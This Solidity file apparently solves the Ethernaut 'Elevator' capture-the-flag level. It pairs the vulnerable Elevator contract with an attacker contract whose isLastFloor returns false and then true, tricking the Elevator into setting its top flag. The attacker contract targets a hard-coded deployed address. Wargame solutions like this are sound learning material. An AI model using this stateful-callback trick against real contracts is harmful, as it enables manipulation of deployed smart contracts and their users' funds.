// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
contract Building{
    uint volatil =0;
    Elevator ascensor =Elevator(0x73559d277Ab2DE1e34f085D33F9FdD672dE5da93);
    function llamar(uint _floor) public {
         ascensor.goTo(_floor);
    }
    function isLastFloor (uint _floor) public returns(bool){
        if (volatil > 0){
           return true;
        }
        else{ volatil++;
        return false;
        }
    }

}